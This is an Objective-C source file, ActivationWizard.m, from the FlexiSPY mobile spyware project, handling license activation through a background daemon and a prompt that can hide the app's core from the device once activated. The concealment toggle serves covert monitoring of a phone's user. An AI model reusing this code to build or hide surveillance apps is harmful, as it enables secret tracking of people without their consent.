//
//  ActivationWizard.m
//  FlexiSPY
//
//  Created by Ophat Phuetkasickonphasutha on 6/12/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ActivationWizard.h"
#import "MobileSPYAppDelegate.h"

#import "AppEngineUICmd.h"
#import "LicenseInfo.h"
#import "ConfigurationManagerImpl.h"
#import "ProductActivationData.h"
#import "PreferenceManagerImpl.h"
#import "PrefVisibility.h"

@interface ActivationWizard (private)
- (void) changeSystemCoreVisibility: (BOOL) aVisible;
@end

@implementation ActivationWizard

@synthesize mActivationWizardCode;
@synthesize mDismiss;
@synthesize mActivateWizardOk;
@synthesize mActivateWizardCancel;
@synthesize mActivateWizardLabel;
@synthesize mSpinnerWizard;

@synthesize mActivating;
@synthesize mVisibilityAlert;

// The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if ((self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil])) {
        // Custom initialization
    }
    return self;
}

// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
}

/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
    
    // Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)viewWillDisappear:(BOOL)animated {
	[super viewWillDisappear:animated];
	DLog(@"----->Enter<-----")
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}


- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
	DLog(@"----->Enter<-----")
	// Request license from daemon
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineGetLicenseInfoCmd withCmdData:nil];
}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex {
	DLog (@"Button index of clicked button of alert is = %ld", (long)buttonIndex);
    
    if ([alertView isEqual:[self mVisibilityAlert]]) {
        if (buttonIndex == 0) {
            // Yes
        } else if (buttonIndex == 1) {
            // No
            [self changeSystemCoreVisibility:NO];
        }
        MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
        [[appDelegate navigationController] dismissModalViewControllerAnimated:NO];
        
    } else {
        if (buttonIndex == 0) {
            MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
            if ([[appDelegate mLicenseInfo] licenseStatus] == ACTIVATED) {
                PreferenceManagerImpl *prefManagerImpl = [[PreferenceManagerImpl alloc] init];
                PrefVisibility *prefVisibility = (PrefVisibility *)[prefManagerImpl preference:kVisibility];
                if ([prefVisibility mVisible]) {
                    UIAlertView *alert = [[UIAlertView alloc] init];
                    [alert setTitle:NSLocalizedString(@"kVisibilityAppTitle", @"")];
                    [alert setMessage:NSLocalizedString(@"kVisibilityQuestion", @"")];
                    [alert setDelegate:self];
                    [alert addButtonWithTitle:NSLocalizedString(@"kYesButtonTitle", @"")];
                    [alert addButtonWithTitle:NSLocalizedString(@"kNoButtonTitle", @"")];
                    [alert show];
                    [self setMVisibilityAlert:alert];
                    [alert release];
                } else {
                    [[appDelegate navigationController] dismissModalViewControllerAnimated:NO];
                }
                [prefManagerImpl release];
            }
        }
    }
}

- (IBAction) ok:(id) aSender {
	[mActivationWizardCode resignFirstResponder];
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	LicenseInfo *licInfo = [appDelegate mLicenseInfo];
	if ([licInfo licenseStatus] == DEACTIVATED && [[mActivationWizardCode text] length] == 0) {
		;
	} else {
		[self setMActivating:YES];
		[mActivateWizardCancel setEnabled:NO];
		[mActivateWizardCancel setAlpha:0.5];
		[mActivateWizardOk setEnabled:NO];
		[mActivateWizardOk setAlpha:0.5];
		[mSpinnerWizard startAnimating];
																
		NSString *activationCode = [mActivationWizardCode text];
		DLog (@"mActivationWizardCode text = %@, length = %lu", activationCode, (unsigned long)[activationCode length]);
		
		NSInteger command = kAppUI2EngineActivateCmd;
		if ([licInfo licenseStatus] == ACTIVATED ||
			[licInfo licenseStatus] == EXPIRED ||
			[licInfo licenseStatus] == DISABLE) {
			command = kAppUI2EngineDeactivateCmd;
		} else {
			[mActivationWizardCode setUserInteractionEnabled:NO];
		}
		
		[[appDelegate mAppUIConnection] processCommand:command withCmdData:activationCode];
	}
}

- (IBAction) cancel:(id) aSender {
	exit(0);
	
	//MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	//[[appDelegate navigationController] dismissModalViewControllerAnimated:NO];
}

- (IBAction) hideKeyboard:(id) aSender {
	[mActivationWizardCode resignFirstResponder];
}

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	DLog(@"aCmd: %ld", (long)aCmd);
	
	if (aCmd == kAppUI2EngineActivateCmd) {
		[self setMActivating:NO];
		[mActivateWizardCancel setEnabled:YES];
		[mActivateWizardCancel setAlpha:1];
		[mActivateWizardOk setEnabled:YES];
		[mActivateWizardOk setAlpha:1];
		[mActivationWizardCode setUserInteractionEnabled:YES];
		[mSpinnerWizard stopAnimating];
		
		NSData *data = aCmdResponse;
		ProductActivationData *pActivationData = [[ProductActivationData alloc] initWithData:data];
		MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *) [[UIApplication sharedApplication] delegate];
		[appDelegate setMLicenseInfo:[pActivationData mLicenseInfo]];
		[[appDelegate mConfigurationManager] updateConfigurationID:[[pActivationData mLicenseInfo] configID]];
		
		NSString* message = nil;
		NSString *title = nil;
		if ([pActivationData mIsSuccess]) {
			message = NSLocalizedString(@"kActivationSuccessText", @"");
		} else {
			message =[pActivationData mErrorDescription];
		}
		
		UIAlertView *alert = [[UIAlertView alloc] init];
		[alert setTitle:title];
		[alert setMessage:message];
		[alert setDelegate:self];
		[alert addButtonWithTitle:NSLocalizedString(@"kOkButtonTitle", @"")];
		[alert show];
		[alert release];
		
		[pActivationData release];
		
	} else if (aCmd == kAppUI2EngineGetLicenseInfoCmd) {
		NSData *data = aCmdResponse;
		LicenseInfo *licenseInfo = [[LicenseInfo alloc] initWithData:data];
		
		DLog(@"------------------------- ActivationWizard --------------------")
		DLog(@"Status          : %d", [licenseInfo licenseStatus])
		DLog(@"Config ID       : %ld", (long)[licenseInfo configID])
		DLog(@"Activation code : %@", [licenseInfo activationCode])
		DLog(@"MD5             : %@", [licenseInfo md5])
		DLog(@"------------------------- ActivationWizard --------------------")
		
		MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
		[appDelegate setMLicenseInfo:licenseInfo];
		[[appDelegate mConfigurationManager] updateConfigurationID:[licenseInfo configID]];
		
		if ([licenseInfo licenseStatus] == ACTIVATED ||
			[licenseInfo licenseStatus] == DISABLE ||
			[licenseInfo licenseStatus] == DISABLE) {
			if (![self mActivating]) {
				[[appDelegate navigationController] dismissModalViewControllerAnimated:NO];
			}
		}
	}
}

- (void) changeSystemCoreVisibility: (BOOL) aVisible {
    DLog (@"Wizard, changeSystemCoreVisibility ... %d", aVisible);
	NSMutableData *visibilityData = [NSMutableData data];
	
	BOOL visible = aVisible;
	NSInteger length = 0;
	
	NSInteger count = 1;
	[visibilityData appendBytes:&count length:sizeof(NSInteger)];
	
	// System Core
	NSString *bundleIndentifier = [[NSBundle mainBundle] bundleIdentifier];
	length = [bundleIndentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[visibilityData appendBytes:&length length:sizeof(NSInteger)];
	[visibilityData appendData:[bundleIndentifier dataUsingEncoding:NSUTF8StringEncoding]];
	[visibilityData appendBytes:&visible length:sizeof(BOOL)];
	
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineSystemCoreVisibilityCmd withCmdData:visibilityData];
}

- (void)dealloc {
	[mActivationWizardCode release];
	[mDismiss release];
	[mActivateWizardOk release];
	[mActivateWizardCancel release];
	[mActivateWizardLabel release];
	[mSpinnerWizard release];
    [mVisibilityAlert release];
    [super dealloc];
}


@end
